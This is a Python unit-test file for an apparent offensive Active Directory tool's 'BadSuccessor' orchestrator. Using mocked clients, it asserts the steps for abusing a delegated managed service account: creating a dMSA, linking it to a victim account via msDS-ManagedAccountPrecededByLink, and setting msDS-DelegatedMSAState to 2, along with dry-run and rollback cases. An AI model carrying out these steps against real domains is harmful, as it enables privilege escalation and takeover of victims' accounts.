import pytest
from unittest.mock import MagicMock, call

from soaphound.attacks.badsuccessor import BadSuccessorOrchestrator


def _make_orchestrator(**overrides):
    defaults = dict(
        nmf_client=MagicMock(),
        rollback_nmf_client=MagicMock(),
        adws_connect=MagicMock(),
        dc_fqdn="dc.jjk.local",
        target_dn="CN=testVictim,CN=Users,DC=jjk,DC=local",
        dmsa_cn="testDmsa",
        dmsa_ou="OU=ControlledOU,DC=jjk,DC=local",
    )
    defaults.update(overrides)
    defaults["nmf_client"].send.return_value = None
    defaults["nmf_client"].recv.return_value = "<s:Envelope>...success...</s:Envelope>"
    defaults["rollback_nmf_client"].send.return_value = None
    defaults["rollback_nmf_client"].recv.return_value = "<s:Envelope>...success...</s:Envelope>"
    defaults["adws_connect"].put.return_value = True
    return BadSuccessorOrchestrator(**defaults)


def test_three_ops_run_in_order():
    orch = _make_orchestrator()
    assert orch.run() is True
    # Op 1 = NMF send (Create), Op 2+3 = adws_connect.put
    assert orch.nmf_client.send.call_count == 1
    put_calls = orch.adws_connect.put.call_args_list
    assert len(put_calls) == 2
    assert put_calls[0] == call(
        "CN=testDmsa,OU=ControlledOU,DC=jjk,DC=local",
        "replace",
        "addata:msDS-ManagedAccountPrecededByLink",
        "string",
        "CN=testVictim,CN=Users,DC=jjk,DC=local",
    )
    assert put_calls[1] == call(
        "CN=testDmsa,OU=ControlledOU,DC=jjk,DC=local",
        "replace",
        "addata:msDS-DelegatedMSAState",
        "string",
        "2",
    )


def test_stops_on_op1_fail():
    orch = _make_orchestrator()
    orch.nmf_client.recv.return_value = "<s:Fault><s:Code>insufficientAccessRights</s:Code></s:Fault>"
    assert orch.run() is False
    assert orch.adws_connect.put.call_count == 0


def test_dry_run_does_not_send():
    orch = _make_orchestrator(dry_run=True)
    assert orch.run() is True
    assert orch.nmf_client.send.call_count == 0
    assert orch.adws_connect.put.call_count == 0


def test_rollback_deletes_dmsa():
    orch = _make_orchestrator(rollback=True)
    assert orch.run() is True
    sent = orch.rollback_nmf_client.send.call_args[0][0]
    assert "transfer/Delete" in sent
    assert "CN=testDmsa,OU=ControlledOU,DC=jjk,DC=local" in sent


def test_op2_raises_when_put_returns_false():
    orch = _make_orchestrator()
    orch.adws_connect.put.side_effect = [False, True]  # Op 2 fail, Op 3 never reached
    assert orch.run() is False
    assert orch.adws_connect.put.call_count == 1


def test_op3_raises_when_put_returns_false():
    orch = _make_orchestrator()
    orch.adws_connect.put.side_effect = [True, False]  # Op 2 OK, Op 3 fail
    assert orch.run() is False
    assert orch.adws_connect.put.call_count == 2
